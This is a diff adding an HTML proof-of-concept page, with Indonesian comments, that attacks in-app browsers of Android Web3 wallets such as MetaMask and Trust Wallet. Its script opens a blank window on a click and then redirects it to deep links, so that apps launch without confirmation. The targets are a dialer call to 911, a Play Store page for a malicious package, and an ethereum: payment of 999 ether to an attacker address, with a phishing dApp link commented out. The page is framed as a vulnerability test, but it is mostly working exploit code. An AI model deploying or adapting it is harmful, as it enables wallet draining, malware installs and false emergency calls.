@@ -1,0 +1,76 @@
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  body { 
+    font-family: sans-serif; 
+    text-align: center; 
+    margin-top: 100px; 
+    font-size: 1.5em; 
+    background: #000; 
+    color: #0f0; 
+  }
+  button { 
+    font-size: 1.3em; 
+    padding: 20px 40px; 
+    margin: 20px;
+    background: #c00; 
+    color: white; 
+    border: none; 
+    border-radius: 12px; 
+  }
+  .warning { color: #f00; font-size: 0.8em; }
+</style>
+</head>
+<body>
+<h1>Android Web3 Wallet Exploit PoC</h1>
+<p>Arbitrary Deep Link / External Protocol Launch<br>(Bypass Popup Blocker – Desember 2025)</p>
+
+<button id="harmless">Test Harmless (Buka Dialer)</button>
+<button id="dangerous">Test Dangerous (Buka Play Store App Malicious)</button>
+<button id="web3">Test Web3 Hijack (Ethereum Deep Link)</button>
+
+<p class="warning">Jika salah satu tombol berhasil langsung buka app tanpa konfirmasi tambahan → walletmu vulnerable!</p>
+
+<script>
+// Fungsi utama exploit – classic bypass yang masih hidup di 2025
+function launchExploit(url) {
+    // Step 1: Open empty popup/new tab dengan user gesture → tidak diblok
+    let evilWin = window.open('', '_blank');
+    
+    // Step 2: Langsung redirect ke external protocol/deep link
+    // Di Android Chrome/Custom Tabs, ini lolos tanpa popup warning kalau dari gesture
+    setTimeout(() => {
+        evilWin.location = url;
+    }, 100); // Delay kecil biar lebih reliable
+    
+    // Optional: Blur window supaya tidak ganggu (kadang work di beberapa wallet)
+    // evilWin.blur();
+    // window.focus();
+}
+
+// Test 1: Harmless – buka phone dialer
+document.getElementById('harmless').addEventListener('click', () => {
+    launchExploit('tel:911'); // atau 'tel:1122334455' kalau takut emergency
+});
+
+// Test 2: Dangerous – buka Play Store ke app arbitrary (bisa diganti package malicious)
+document.getElementById('dangerous').addEventListener('click', () => {
+    launchExploit('market://details?id=com.example.malicious'); // ganti dengan package nyata
+    // Contoh nyata: 'market://details?id=com.bank.app' → force buka banking app
+});
+
+// Test 3: Web3 Specific – hijack transaction atau connect ke dApp lain
+document.getElementById('web3').addEventListener('click', () => {
+    // Contoh drain ke address attacker (jika wallet handle ethereum: tanpa konfirmasi ketat)
+    launchExploit('ethereum:0xDead000000000000000000000000000000000000?value=999ether');
+    // Atau hijack ke dApp phishing
+    // launchExploit('ethereum://malicious-dapp.com');
+});
+</script>
+
+<p>Test ini di MetaMask/Trust Wallet/Rainbow → connect ke dApp kamu → klik tombol.<br>
+Kalau langsung buka dialer/Play Store/transaction prompt → critical vuln (bisa full wallet drain!).</p>
+</body>
+</html>
